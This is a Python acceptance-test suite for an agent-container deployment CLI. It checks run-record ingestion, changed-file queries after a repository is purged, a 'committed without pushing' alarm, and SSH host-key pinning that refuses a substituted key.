    """T049 (research R10). Ingestion runs a throwaway container on the HOST and
    streams the runs volume as a tar over the runtime's stdout — a mechanism whose
    entire reason for existing is that the operator's machine shares no filesystem
    with the host the container ran on.

    Every other 016 test here ingests from the default local daemon, which is the
    one path that would still work if the argv were built without the context. So
    the remote mechanism would be untested while the suite stayed green. A
    non-default docker context aimed at the same daemon exercises the
    context-targeted argv without a second machine (the pattern T016a uses).

    The stand-in agent exits 0 for a reason MEASURED here: the real uncredentialed
    agent exits 1, the deployment's `restart: on-failure` policy starts it again,
    and the environment then holds one record per attempt. Each of those IS a run
    and the records were right — but a test asserting "the record" would be
    asserting a race.

    A bind workspace is legal here because the registered host's address is
    localhost (`host_is_local`); only the ingestion argv is context-targeted, which
    is exactly the part under test.
    """
    ctx = subprocess.run(
        ["docker", "context", "show"], capture_output=True, text=True
    ).stdout.strip()
    cfg = _config_dir_of(acc.state_dir)
    cfg.mkdir(parents=True, exist_ok=True)
    cfg.joinpath("hosts.json").write_text(
        json.dumps(
            {
                "version": 1,
                "default": None,
                "hosts": {"acc16ctx": {"driver": "docker", "context": ctx, "address": "localhost"}},
            }
        )
    )
    ws = _fake_agent(acc, "context", "exit 0")
    env_file = acc.tmp / "ctx.env"
    env_file.write_text(
        f"GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n{_FAKE_AGENT_PATH}\n"
    )
    acc.register("acc16rem")
    up = acc.cli(
        [
            "up",
            "acc16rem",
            "--host",
            "acc16ctx",
            "--env-file",
            str(env_file),
            "--mode",
            "headless",
            "--agent",
            "claude",
            "--task",
            "ingested over a context",
            "--workspace",
            "bind",
            "--workspace-dir",
            str(ws),
            "--foreground",
        ]
    )
    assert up.returncode == 0, f"up over a context failed:\n{up.stdout}\n{up.stderr}"

    r = acc.cli(["runs", "list", "acc16rem", "--host", "acc16ctx", "--json"])
    assert r.returncode == 0, f"runs list over a context failed:\n{r.stdout}\n{r.stderr}"
    runs = json.loads(r.stdout)["data"]["runs"]
    assert len(runs) == 1, f"the record never came off the volume over a context: {runs}"
    assert runs[0]["task"] == "ingested over a context"
    assert runs[0]["ended_at"], f"an incomplete record was ingested: {runs[0]}"
    # `host` is stamped at ingestion by the drain that read the volume, so this
    # names WHICH host's drain did it. Without it the assertion above would pass on
    # a build that silently fell back to the default daemon — the very failure this
    # test exists to exclude.
    assert runs[0]["host"] == "acc16ctx", f"the record was ingested by another host: {runs[0]}"
    # And it is not ALSO sitting under the default host: a complete record is
    # cleared from the volume once stored, so a second copy would mean the drain
    # ran twice under two names and `runs list` would double-count every run.
    local = acc.cli(["runs", "list", "acc16rem", "--json"])
    assert json.loads(local.stdout)["data"]["runs"] == [], (
        "the same record is stored under the default host as well: " + local.stdout
    )
    # Torn down THROUGH THE HOST IT WAS DEPLOYED TO. The fixture's own teardown
    # runs against the default host, which reaches the container (same daemon) but
    # leaves the compose project's network behind — measured, once per run.
    acc.cli(["down", "acc16rem", "--host", "acc16ctx", "--purge", "-y"])


# --- T055/T056: which run changed this file, with the repository GONE ---------
#
# These need a run that really commits, which needs a git repository the container
# can WRITE to. A bind workspace cannot be it: on macOS+Lima the host mount is
# read-only and its root is uid 0 inside the container, so git refuses the
# directory outright (measured). So the repository is built on the PERSISTENT
# workspace volume — dev-owned, and it survives the down/up cycle each run needs.
#
# The stand-in agent lives on that volume too and runs the task as a shell script
# (`claude -p "<task>"` → `$2`). The task is the only per-run channel a headless
# run has, and these runs must each change something DIFFERENT.
_TASK_RUNNER = '#!/bin/sh\n# acceptance stand-in: the task text IS the script\nexec sh -c "$2"\n'
_GIT_ID = "git -c user.name=Test -c user.email=t@example.com"


def _seed_repo_over_ssh(acc, name: str) -> None:
    """Deploy <name> interactively, build a git repository plus the stand-in agent
    on its persistent workspace, and stop it again (volumes kept)."""
    key = _gen_keypair(acc.tmp / f"{name}-key")
    port = acc.up(name, workspace="persistent", authorized_key=[key.with_suffix(".pub")])
    script = (
        "set -e; cd /workspace; mkdir -p src/auth docs; "
        "echo seed > src/auth/session.py; echo seed > README.md; echo seed > docs/notes.md; "
        f"printf '%s' '{_TASK_RUNNER}' > claude; chmod +x claude; "
        f"git init -q -b main .; {_GIT_ID} add -A; {_GIT_ID} commit -qm seed; "
        "git rev-parse HEAD"
    )
    r = _ssh(port, key, script)
    assert r.returncode == 0, f"seeding {name} failed:\n{r.stdout}\n{r.stderr}"
    acc.down(name)  # no --purge: the workspace and the records stay


def _headless_run(acc, name: str, task: str) -> None:
    """One more run against the seeded environment, then stop it again."""
    r = acc.up(
        name,
        mode="headless",
        agent="claude",
        task=task,
        workspace="persistent",
        env_extra=[_FAKE_AGENT_PATH],
        foreground=True,
        wait=False,
    )
    assert r.returncode == 0, f"run '{task}' failed:\n{r.stdout}\n{r.stderr}"
    acc.down(name)


def _by_task(runs: list[dict]) -> dict[str, dict]:
    return {r["task"]: r for r in runs if r.get("task")}


_TOUCH_SESSION = f"cd /workspace && echo a >> src/auth/session.py && {_GIT_ID} commit -aqm r1 #1"
_TOUCH_README = f"cd /workspace && echo b >> README.md && {_GIT_ID} commit -aqm r2 #2"
_TOUCH_BOTH = (
    f"cd /workspace && echo c >> src/auth/session.py && echo c >> docs/notes.md "
    f"&& {_GIT_ID} commit -aqm r3 #3"
)
_TOUCH_NOTES = f"cd /workspace && echo d >> docs/notes.md && {_GIT_ID} commit -aqm r4 #4"
_TOUCH_NOTHING = "true #5"


def test_changed_answers_from_records_alone_with_the_repository_destroyed(acc):
    """T055 / quickstart S13 (C16, SC-007). With N >= 5 runs recorded, `--changed`
    must name exactly the runs that touched the file, newest-first — and give the
    SAME answer after the repository is destroyed.

    The second half is the point. The paths are captured when each run ENDS
    (research R11), so the answer needs no clone, no SHA resolution and no history
    that still contains those commits. A build that resolved SHAs at query time
    passes the first half and fails exactly when the record is most valuable: the
    environment is gone and the record is all that is left.

    The seeding session is asserted to come back UNCERTAIN rather than as a
    confident 'no': it started on an empty workspace and created the repository, so
    its changed-path list is knowingly incomplete. A build that reported it as a
    clean no would be answering SC-007 with a confident wrong answer.
    """
    _seed_repo_over_ssh(acc, "acc16chg")
    for task in (_TOUCH_SESSION, _TOUCH_README, _TOUCH_BOTH, _TOUCH_NOTES, _TOUCH_NOTHING):
        _headless_run(acc, "acc16chg", task)

    all_runs = _runs(acc, "acc16chg")
    assert len(all_runs) == 6, f"expected the session plus five runs, got: {all_runs}"
    by_task = _by_task(all_runs)
    assert set(by_task) == {
        _TOUCH_SESSION,
        _TOUCH_README,
        _TOUCH_BOTH,
        _TOUCH_NOTES,
        _TOUCH_NOTHING,
    }, sorted(by_task)

    def changed(path: str) -> dict:
        r = acc.cli(["runs", "list", "acc16chg", "--changed", path, "--json"])
        assert r.returncode == 0, f"--changed {path} failed:\n{r.stdout}\n{r.stderr}"
        return json.loads(r.stdout)["data"]

    before = changed("src/auth/session.py")
    assert [x["run_id"] for x in before["runs"]] == [
        by_task[_TOUCH_BOTH]["run_id"],
        by_task[_TOUCH_SESSION]["run_id"],
    ], f"wrong runs, or wrong order (newest first): {before['runs']}"
    # The run that committed nothing is a CONFIDENT no — its path list was captured
    # and is empty, which is knowledge, not silence.
    assert by_task[_TOUCH_NOTHING]["run_id"] not in [
        x["run_id"] for x in before["runs"] + before["uncertain"]
    ], before
    # The seeding session cannot be ruled out. Its verdict names the shape of the
    # gap ("the list was truncated") and its own record carries the reason the
    # capture set that flag — the two are deliberately separate: the query knows
    # only that the list is incomplete, and the run knows why.
    seed = [r for r in all_runs if r["kind"] == "interactive"]
    assert len(seed) == 1, f"expected exactly one interactive session record: {all_runs}"
    assert seed[0]["run_id"] in {x["run_id"] for x in before["uncertain"]}, (
        f"the session that CREATED the repository was ruled out: {before['uncertain']}"
    )
    assert any("held no repository" in n for n in seed[0]["notes"]), seed[0]["notes"]

    acc.down("acc16chg", purge=True)
    assert acc.volumes_of("acc16chg") == [], "the workspace survived the purge; nothing is proven"

    after = changed("src/auth/session.py")
    assert [x["run_id"] for x in after["runs"]] == [x["run_id"] for x in before["runs"]], (
        "the answer changed once the repository was destroyed — the paths are being "
        f"resolved at query time, not read from the records:\n{before}\n{after}"
    )
    # A DIFFERENT path, to prove the query discriminates rather than returning
    # whatever it has: two other runs touched this one, and the assertion names
    # both of them rather than merely checking the result is non-empty.
    assert [x["run_id"] for x in changed("docs/notes.md")["runs"]] == [
        by_task[_TOUCH_NOTES]["run_id"],
        by_task[_TOUCH_BOTH]["run_id"],
    ]
    assert [x["run_id"] for x in changed("src/auth")["runs"]] == [
        x["run_id"] for x in after["runs"]
    ], "a directory must answer for the files under it"


def test_a_commit_that_can_no_longer_be_resolved_still_reads(acc):
    """T056 (spec edge case, analyze finding G3). Every commit id in the store is
    unresolvable the moment the environment is gone — there is no repository left
    on the operator's machine to resolve it against, and `runs show` never opens
    one.

    So the requirement is that the record degrades to what it still knows: the ids
    are shown as the ids they are, the changed paths still answer, and nothing
    crashes or quietly drops the field. A renderer that tried to look a commit up
    would fail here on every record it has ever stored.
    """
    _seed_repo_over_ssh(acc, "acc16sha")
    _headless_run(acc, "acc16sha", _TOUCH_SESSION)

    run = _by_task(_runs(acc, "acc16sha"))[_TOUCH_SESSION]
    commits = run["repository"]["commits"]
    assert len(commits) == 1, f"one commit was made, one must be recorded: {run['repository']}"
    sha = commits[0]

    acc.down("acc16sha", purge=True)
    assert acc.volumes_of("acc16sha") == []

    shown = acc.cli(["runs", "show", run["run_id"]])
    assert shown.returncode == 0, (
        f"showing a record whose repository is gone failed:\n{shown.stderr}"
    )
    assert sha in shown.stdout, f"the commit id was dropped rather than shown:\n{shown.stdout}"
    assert "src/auth/session.py" in shown.stdout, f"the changed path was dropped:\n{shown.stdout}"
    # The record is a summary that points at the logs; it must not have grown a
    # commit MESSAGE it could only have got by resolving the id (C15).
    assert "not the logs" in shown.stdout
    still = acc.cli(["runs", "list", "acc16sha", "--changed", "src/auth/session.py", "--json"])
    assert still.returncode == 0, still.stderr
    assert [x["run_id"] for x in json.loads(still.stdout)["data"]["runs"]] == [run["run_id"]]


# --- T031: the push alarm, against real runs that really commit ---------------
#
# The three git positions below are the ones C8 has to tell apart, and they are
# built by the RUN rather than by the harness: `pushed` and `commits` are captured
# inside the container from the repository as it stands at exit (FR-004a), so a
# test that hand-wrote a record would be exercising the renderer against data no
# entrypoint ever produced.
#
# The repository is on the PERSISTENT workspace for the reason T055 records: a
# bind workspace is read-only and root-owned inside the container under Lima, and
# git refuses the directory outright.
#
# `origin` is a bare repo in the container's own layer, not on any network. What
# the exit capture reads is the LOCAL tracking ref (`@{u}` and `merge-base
# --is-ancestor` touch no remote), so the 'remote' does not have to outlive the
# container that made it — and no credential, egress declaration or real host is
# dragged into a test about a push flag.
_UNATTRIBUTABLE_UNPUSHED = (
    "cd /workspace "
    "&& git init -q -b main . "
    "&& git init -q --bare -b main /home/dev/origin.git "
    "&& git remote add origin /home/dev/origin.git "
    f"&& echo pushed > pushed.txt && {_GIT_ID} add -A && {_GIT_ID} commit -qm p1 "
    "&& git push -q -u origin main "
    f"&& echo at-risk > at-risk.txt && {_GIT_ID} add -A && {_GIT_ID} commit -qm p2 #A"
)
_COMMITTED_WITHOUT_PUSHING = (
    f"cd /workspace && echo more >> at-risk.txt && {_GIT_ID} commit -aqm p3 #B"
)
_COMMITTED_WITH_NO_UPSTREAM = (
    "cd /workspace && git branch --unset-upstream "
    f"&& echo more >> at-risk.txt && {_GIT_ID} commit -aqm p4 #C"
)


def _seed_task_runner_over_ssh(acc, name: str) -> None:
    """Deploy <name> interactively, put the task-running stand-in agent on its
    persistent workspace, and stop it again (volumes kept).

    Deliberately NOT `_seed_repo_over_ssh`: the first run below must start on a
    workspace that holds NO repository, because that is what makes its commit list
    unattributable — and an unattributable commit list with `pushed: false` is the
    precise shape a defect in `push_status` once rendered as 'nothing to push'.
    """
    key = _gen_keypair(acc.tmp / f"{name}-key")
    port = acc.up(name, workspace="persistent", authorized_key=[key.with_suffix(".pub")])
    script = f"set -e; cd /workspace; printf '%s' '{_TASK_RUNNER}' > claude; chmod +x claude"
    r = _ssh(port, key, script)
    assert r.returncode == 0, f"seeding {name} failed:\n{r.stdout}\n{r.stderr}"
    acc.down(name)  # no --purge: the workspace and the records stay


def test_committing_without_pushing_is_LOUD_and_no_upstream_is_NOT(acc):
    """T031 / quickstart S5 (C8, FR-005, FR-004a, SC-003). Three real runs, three
    git positions, one classifier — and the alarm must fire on exactly two of them.

    All three runs exit 0 and are recorded `finished`. That is the point: SC-003's
    failure is a run that "looks like a clean success", and every one of these
    does. The only thing separating the work that is safe from the work that
    exists solely in a container now gone is what the record says about `pushed`.

    The three positions:

    * `_UNATTRIBUTABLE_UNPUSHED` — the run CREATES the repository, pushes once,
      then commits again without pushing. `pushed: false` with `commits: []`,
      because nothing in a history the run did not start with is attributable to
      it (the record says so in a note). This is the shape a HIGH defect got wrong:
      `push_status` classified on `commits`, so an empty list — which the writer
      emits for UNKNOWN as well as for none — rendered as "nothing to push" and
      left `--json`'s `unpushed` empty, announcing a clean success for a run whose
      work was only in the container. Both halves are asserted here.
    * `_COMMITTED_WITHOUT_PUSHING` — the ordinary shape: an attributable commit,
      an upstream to compare against, and `pushed: false`.
    * `_COMMITTED_WITH_NO_UPSTREAM` — committed with the upstream unset, so
      `pushed` is `null` and the record says "could not tell". C8 requires this NOT
      to be the alarm: conflating "could not tell" with "did not push" is what
      makes the loudest signal in the feature unreliable.

    If the first record ever stops carrying `commits: []`, this test no longer
    covers the regression it was written for — construct that shape another way
    rather than relaxing the assertion.
    """
    _seed_task_runner_over_ssh(acc, "acc16psh")
    for task in (
        _UNATTRIBUTABLE_UNPUSHED,
        _COMMITTED_WITHOUT_PUSHING,
        _COMMITTED_WITH_NO_UPSTREAM,
    ):
        _headless_run(acc, "acc16psh", task)

    payload = _runs_payload(acc, "acc16psh")
    records = payload["runs"]
    assert len(records) == 4, f"expected the seeding session plus three runs: {records}"
    by_task = _by_task(records)
    assert set(by_task) == {
        _UNATTRIBUTABLE_UNPUSHED,
        _COMMITTED_WITHOUT_PUSHING,
        _COMMITTED_WITH_NO_UPSTREAM,
    }, sorted(by_task)

    # --- the two records that must alarm, and the one that must not ---
    blind = by_task[_UNATTRIBUTABLE_UNPUSHED]
    plain = by_task[_COMMITTED_WITHOUT_PUSHING]
    quiet = by_task[_COMMITTED_WITH_NO_UPSTREAM]
    for rec in (blind, plain, quiet):
        assert rec["outcome"] == "finished" and rec["exit_code"] == 0, (
            f"the run itself must have succeeded — a failure would give an operator "
            f"another reason to look, and this is about the ones that do not: {rec}"
        )
        assert rec["repository"] is not None, (
            f"`repository: null` means NOT CAPTURED (data-model §1), and every one of "
            f"these runs had a workspace to measure: {rec}"
        )

    assert plain["repository"]["pushed"] is False, (
        "the run committed and did not push, which is the failure Constitution I "
        f"exists to prevent — it must be recorded as false, not left unknown: "
        f"{plain['repository']}"
    )
    assert plain["repository"]["state"] == "ok", plain["repository"]
    assert plain["repository"]["upstream"] == "origin/main", plain["repository"]
    assert len(plain["repository"]["commits"]) == 1, (
        f"one commit was made after the last push, one must be attributed: {plain['repository']}"
    )
    assert "at-risk.txt" in plain["repository"]["paths"], plain["repository"]

    assert blind["repository"]["pushed"] is False, (
        "the run committed on top of what it pushed and the exit head is provably "
        f"not on the upstream — that is the alarm, whatever the commit list says: "
        f"{blind['repository']}"
    )
    assert blind["repository"]["commits"] == [], (
        "expected an UNKNOWN (empty + flagged) commit list here: the run created the "
        f"repository, so none of the history at exit is attributable to it: {blind['repository']}"
    )
    assert blind["repository"]["paths_truncated"] is True, (
        f"an empty list that is NOT flagged reads as a confident 'changed nothing': "
        f"{blind['repository']}"
    )
    assert any("held no repository" in n for n in blind["notes"]), blind["notes"]

    assert quiet["repository"]["pushed"] is None, (
        "`pushed: false` with no upstream would be an alarm about a comparison "
        f"nobody could make (C8 — null, never false): {quiet['repository']}"
    )
    assert quiet["repository"]["state"] == "no-upstream", quiet["repository"]
    assert quiet["repository"]["upstream"] is None, quiet["repository"]
    assert len(quiet["repository"]["commits"]) == 1, (
        f"the commit is attributable even with nowhere to push it: {quiet['repository']}"
    )

    # --- the machine-readable alarm (C8, T030) ---
    # Set equality, not "contains": it fails both when an alarm is MISSING and when
    # one is invented for the run that merely could not tell — and the seeding
    # session, which committed nothing at all, must be in neither.
    assert set(payload["unpushed"]) == {blind["run_id"], plain["run_id"]}, (
        f"`unpushed` names the wrong runs. quiet={quiet['run_id']} must NOT be there "
        f"(pushed is null); blind={blind['run_id']} must be (empty commit list, "
        f"pushed false): {payload['unpushed']}"
    )

    # --- the human alarm, which has to agree with it ---
    listed = acc.cli(["runs", "list", "acc16psh"])
    assert listed.returncode == 0, f"runs list failed:\n{listed.stdout}\n{listed.stderr}"
    alarm = [ln for ln in _plain(listed.stdout).splitlines() if "COMMITTED WITHOUT PUSHING" in ln]
    assert len(alarm) == 1, (
        f"the listing must say, in words, that work is only in a container:\n{listed.stdout}"
    )
    assert "2 run(s)" in alarm[0], alarm[0]
    # The ids are on that line because they are the argument `runs show` takes: a
    # count alone announces a problem and leaves the operator to find it.
    assert blind["run_id"] in alarm[0] and plain["run_id"] in alarm[0], alarm[0]
    assert quiet["run_id"] not in alarm[0], (
        f"a run with no upstream was reported as committed-without-pushing: {alarm[0]}"
    )

    # --- one record, rendered: the exact shape the defect got wrong ---
    shown = acc.cli(["runs", "show", blind["run_id"]])
    assert shown.returncode == 0, f"runs show failed:\n{shown.stdout}\n{shown.stderr}"
    text = _plain(shown.stdout)
    assert "COMMITTED WITHOUT PUSHING" in text, (
        f"the loudest signal in the feature is silent for a record whose commit list "
        f"is unknown:\n{text}"
    )
    # The regression's own words. It rendered reassurance from an absence of data.
    assert "nothing to push" not in text, text
    assert "changed files UNKNOWN" in text, (
        f"the empty path list of a run that changed files must read as unknown, not "
        f"as 'no files changed':\n{text}"
    )

    quiet_shown = acc.cli(["runs", "show", quiet["run_id"]])
    assert quiet_shown.returncode == 0, f"runs show failed:\n{quiet_shown.stderr}"
    quiet_text = _plain(quiet_shown.stdout)
    assert "could not tell" in quiet_text, quiet_text
    assert "COMMITTED WITHOUT PUSHING" not in quiet_text, quiet_text


# --- T032: a workspace that holds no repository is a RECORD, not an error ------
#
# An `ephemeral` workspace is the container's own layer, so — unlike the
# persistent one above — nothing on the host can seed it, and the stand-in agent
# has to arrive some other way. `--mount` puts it OUTSIDE /workspace, which is
# also what keeps the test honest: the workspace stays exactly as empty as a
# throwaway run with no `--repo` leaves it.
_STANDIN_BIN = "/opt/agentbin"
_STANDIN_BIN_PATH = (
    f"PATH={_STANDIN_BIN}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
)


def test_an_ephemeral_workspace_with_no_clone_records_no_repository(acc):
    """T032 / quickstart S6 (C7, research R4, data-model §3). A run on an empty
    ephemeral workspace must leave a record that SAYS the workspace held no
    repository.

    `git rev-parse --is-inside-work-tree` exits 128 there (R4, measured), and an
    ephemeral workspace with no clone is the ordinary case for a throwaway run —
    so the two wrong answers are a run that dies on the capture and a record whose
    `repository` is null. Null is not a synonym for 'nothing to report': the data
    model gives it one meaning, NOT CAPTURED, which is what a `never-started`
    record carries. A run that looked and found nothing knows something a run that
    never looked does not, and a null here would throw that away — and would make
    `runs list --changed` unable to rule the run out (it rules out
    `no-repository`, never a null).
    """
    ws = _fake_agent(acc, "ephemeral", "exit 0")
    r = acc.up(
        "acc16eph",
        mode="headless",
        agent="claude",
        task="nothing to clone",
        workspace="ephemeral",
        mount=[f"{ws}:{_STANDIN_BIN}"],
        env_extra=[_STANDIN_BIN_PATH],
        foreground=True,
        wait=False,
    )
    assert r.returncode == 0, f"up failed:\n{r.stdout}\n{r.stderr}"

    runs = _runs(acc, "acc16eph")
    assert len(runs) == 1, f"one run, one record: {runs}"
    rec = runs[0]
    assert rec["outcome"] == "finished" and rec["exit_code"] == 0, (
        f"the capture must not have cost the run its own result (FR-008): {rec}"
    )
    assert rec["ended_at"], f"the record was never completed: {rec}"
    repo = rec["repository"]
    assert repo is not None, (
        "`repository: null` means NOT CAPTURED (data-model §1) — this run looked and "
        f"found nothing, which is a different and better-known fact: {rec}"
    )
    assert repo["state"] == "no-repository", (
        f"the five states of C7 are each a record, not an error: {repo}"
    )
    assert repo["end_head"] is None and repo["branch"] is None, repo
    assert repo["pushed"] is None, (
        f"there was no upstream to compare against, so `pushed` is null and never "
        f"false — false is the alarm FR-005 requires to mean something: {repo}"
    )
    assert repo["commits"] == [] and repo["paths"] == [], repo

    # Rendered, and asserted POSITIVELY. `render_repository` emits ONE row for a
    # null repository and four for a captured one, so the presence of the push and
    # files rows is what distinguishes 'looked, found nothing' from 'never looked'
    # — where an absence check would also pass on output that merely wrapped.
    shown = acc.cli(["runs", "show", rec["run_id"]])
    assert shown.returncode == 0, f"runs show failed:\n{shown.stdout}\n{shown.stderr}"
    text = _plain(shown.stdout)
    assert "no-repository" in text, text
    assert "could not tell" in text, text
    assert "no files changed" in text, text
    assert "COMMITTED WITHOUT PUSHING" not in text, text


# --- Feature 018: verified attach, no private host key on disk ----------------
# The strongest evidence here is an ABSENCE: no private key anywhere, and a
# substituted key REFUSED. A pin that never refuses passes every other test in
# this file, so T020 below is the one that actually proves the feature.


def _pinned_lines(acc) -> list[str]:
    kh = acc.state_dir / "agent-container" / "local" / "known_hosts"
    return [ln for ln in kh.read_text().splitlines() if ln.strip()] if kh.is_file() else []


def test_deploy_pins_the_containers_public_key(acc):
    """C1/S1: capture happens at deploy, through the runtime, and what lands in the
    file is the key the container is really using."""
    port = acc.up("accpin")
    lines = _pinned_lines(acc)
    assert len(lines) == 1, lines
    assert lines[0].startswith(f"[localhost]:{port} ssh-ed25519 ")
    # The pinned key IS the container's key, not merely a well-formed line.
    blob = lines[0].split()[2]
    r = subprocess.run(
        [RUNTIME, "exec", "agent-container-accpin", "cat",
         "/home/dev/.ssh/hostkeys/ssh_host_ed25519_key.pub"],
        capture_output=True, text=True,
    )  # fmt: skip
    assert blob == r.stdout.split()[1]
    assert "PRIVATE" not in lines[0]


def test_attach_print_carries_verification_and_no_prompt_is_needed(acc):
    """T021/SC-002 (argv half): the command attach would run points at the tool's own
    known_hosts with StrictHostKeyChecking=yes.

    This asserts the ARGV, not the absence of a prompt — `--print` never connects, so
    it structurally cannot witness a prompt. test_attach_over_ssh_is_verified below
    carries SC-002's real weight.
    """
    acc.up("accprint")
    r = acc.cli(["attach", "accprint", "--print"])
    assert r.returncode == 0, r.stderr
    assert "StrictHostKeyChecking=yes" in r.stdout
    assert "agent-container/local/known_hosts" in r.stdout
    assert str(Path.home() / ".ssh" / "known_hosts") not in r.stdout  # never the operator's
    assert "will REFUSE" not in r.stderr  # pinned, so no warning


def test_attach_over_ssh_is_verified_with_no_prompt(acc):
    """SC-002 for real (T021a): a genuine ssh connection using ONLY the tool's pinned
    file succeeds, and emits no trust-on-first-use prompt or host-key warning."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("accverify", authorized_key=[laptop.with_suffix(".pub")])
    kh = acc.state_dir / "agent-container" / "local" / "known_hosts"
    r = subprocess.run(
        ["ssh", "-i", str(laptop), "-p", str(port),
         "-o", f"UserKnownHostsFile={kh}", "-o", "StrictHostKeyChecking=yes",
         "-o", "IdentitiesOnly=yes", "-o", "IdentityAgent=none", "-o", "BatchMode=yes",
         "dev@localhost", "whoami"],
        capture_output=True, text=True, timeout=60,
    )  # fmt: skip
    assert r.returncode == 0, r.stderr
    assert r.stdout.strip() == "dev"
    assert "Are you sure you want to continue connecting" not in r.stderr
    assert "REMOTE HOST IDENTIFICATION HAS CHANGED" not in r.stderr
    assert "Warning: Permanently added" not in r.stderr  # nothing was trusted on the fly


def test_a_substituted_host_key_is_REFUSED(acc):
    """T020 — C3/SC-003/S2. THE test for this feature.

    Replace the container's host key OUT OF BAND (no deploy), restart sshd, and
    connect against the pin. It must fail and name the mismatch. If this passes when
    it should not, the pin is decoration and every other 018 test still goes green.
    """
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("accsubst", authorized_key=[laptop.with_suffix(".pub")])
    kh = acc.state_dir / "agent-container" / "local" / "known_hosts"
    pinned_before = _pinned_lines(acc)[0]

    swap = (
        "rm -f ~/.ssh/hostkeys/ssh_host_ed25519_key* && "
        "ssh-keygen -q -t ed25519 -N '' -f ~/.ssh/hostkeys/ssh_host_ed25519_key && "
        "ssh-keygen -y -f ~/.ssh/hostkeys/ssh_host_ed25519_key "
        "> ~/.ssh/hostkeys/ssh_host_ed25519_key.pub && pkill -HUP -x sshd"
    )
    sub = subprocess.run(
        [RUNTIME, "exec", "agent-container-accsubst", "bash", "-lc", swap],
        capture_output=True, text=True,
    )  # fmt: skip
    assert sub.returncode == 0, sub.stderr
    assert _pinned_lines(acc)[0] == pinned_before  # the tool did NOT re-pin: no deploy happened

    _wait_sshd(port)
    r = _ssh_until_protocol_answer(
        ["ssh", "-i", str(laptop), "-p", str(port),
         "-o", f"UserKnownHostsFile={kh}", "-o", "StrictHostKeyChecking=yes",
         "-o", "IdentitiesOnly=yes", "-o", "IdentityAgent=none", "-o", "BatchMode=yes",
         "dev@localhost", "whoami"],
    )  # fmt: skip
    assert r.returncode != 0, "a substituted host key was ACCEPTED — the pin is decoration"
    # The REASON matters as much as the refusal. A transport-level reset is also a
    # non-zero exit, and accepting it here would let this test pass while sshd was
    # merely down — proving nothing about the pin.
    assert "HOST IDENTIFICATION HAS CHANGED" in r.stderr or "host key" in r.stderr.lower(), (
        f"refused, but not for a host-key reason: {r.stderr!r}"
    )


def test_a_tool_caused_recreation_repins_silently(acc):
    """C4/SC-004/S3, paired deliberately with T020: the two directions must not
    collapse into each other, and a bug in either looks like the other working."""
    acc.up("accrepin")
    before = _pinned_lines(acc)[0]
    acc.down("accrepin", purge=True)  # the ssh volume goes, so the key WILL change
    acc.up("accrepin")
    after = _pinned_lines(acc)
    assert len(after) == 1
    assert after[0] != before  # a genuinely new key
    assert after[0].split()[2] != before.split()[2]


def test_two_environments_on_one_host_do_not_cross_verify(acc):
    """C5/SC-005/S4: keyed [address]:port, so one container's key never verifies
    another's connection."""
    p1 = acc.up("accpair1")
    p2 = acc.up("accpair2")
    kh = acc.state_dir / "agent-container" / "local" / "known_hosts"
    lines = _pinned_lines(acc)
    assert len(lines) == 2
    by_port = {ln.split(":")[1].split()[0]: ln.split()[2] for ln in lines}
    assert by_port[str(p1)] != by_port[str(p2)]  # distinct keys
    for target, other in ((f"[localhost]:{p1}", str(p2)), (f"[localhost]:{p2}", str(p1))):
        r = subprocess.run(
            ["ssh-keygen", "-F", target, "-f", str(kh)], capture_output=True, text=True
        )
        assert r.returncode == 0
        assert by_port[other] not in r.stdout  # never the sibling's key


def test_no_private_host_key_is_written_anywhere(acc):
    """T032 — SC-001 at 100%: no HOST key material on disk, over every flag
    combination the CLI still offers. The strongest evidence this feature works is an
    absence.

    Scoped to the host key on purpose, and the carve-out this test used to carry is
    GONE: Feature 003's `--push-key` staged a second plaintext private key under the
    state dir at 0644, so 018 had to exclude `*.push_key` to avoid failing for a
    reason it did not cause. Feature 019 removed that channel, so the exclusion would
    now be dead weight that quietly re-permits the very thing 019 deleted.
    test_no_private_key_of_any_kind_is_written_anywhere below is the unrestricted gate.
    """
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("accnokey", authorized_key=[laptop.with_suffix(".pub")])

    assert list(acc.state_dir.rglob("*.host_key")) == []
    hits = [
        p
        for p in acc.state_dir.rglob("*")
        if p.is_file() and "PRIVATE KEY" in p.read_bytes().decode("utf-8", "replace")
    ]
    assert hits == [], f"unexpected private key material on disk: {hits}"
    # And the pinned file itself holds only public material. (The comparison this
    # line used to make — that an unrelated generated key is absent from known_hosts
    # — was vacuous: nothing could ever have put it there.)
    kh = acc.state_dir / "agent-container" / "local" / "known_hosts"
    assert kh.is_file()
    assert "PRIVATE" not in kh.read_text()


def test_a_stale_pre_018_private_key_is_deleted_and_reported(acc):
    """C11/S7/FR-011: `--purge` never removed this file, so an upgrade that merely
    stopped writing it would leave the exposure in place."""
    acc.up("accstale")
    stale = acc.state_dir / "agent-container" / "local" / "accstale.host_key"
    stale.write_text("-----BEGIN OPENSSH PRIVATE KEY-----\nfake\n")
    # `redeploy` resolves its own env file, so hand it the one the fixture wrote for
    # `up` — otherwise the deploy dies before it can clean anything up.
    r = acc.cli(["redeploy", "accstale", "--env-file", str(acc.tmp / "accstale.env")])
    assert r.returncode == 0, r.stderr
    assert not stale.exists()
    assert "removed a PRIVATE host key" in r.stderr  # never silent


def test_the_operators_own_known_hosts_is_untouched(acc):
    """C6/SC-007/S8: byte-identical before and after."""
    own = Path.home() / ".ssh" / "known_hosts"
    before = own.read_bytes() if own.is_file() else None
    acc.up("accown")
    acc.cli(["attach", "accown", "--print"])
    after = own.read_bytes() if own.is_file() else None
    assert after == before


def test_the_removed_flag_refuses_and_explains(acc):
    """C10/S6/FR-002: not a bare 'no such option' — the operator who used this flag
    had a reason, and it is now served without a private key on their disk."""
    r = acc.cli(["up", "accgone", "--host-key", "/nonexistent"])
    assert r.returncode != 0
    assert "captures the PUBLIC key" in r.stderr
    assert "no private key sits on your disk" in r.stderr


def test_list_json_hands_back_a_usable_known_hosts_line(acc):
    """C12/S11/US3: the line is usable verbatim by a second client — which is the
    non-TOFU way to trust this container from another machine."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    port = acc.up("accjson", authorized_key=[laptop.with_suffix(".pub")])
    r = acc.cli(["list", "--json"])
    assert r.returncode == 0, r.stderr
    rows = json.loads(r.stdout)["data"]["containers"]  # the 009 envelope
    row = next(x for x in rows if x["name"].endswith("accjson"))
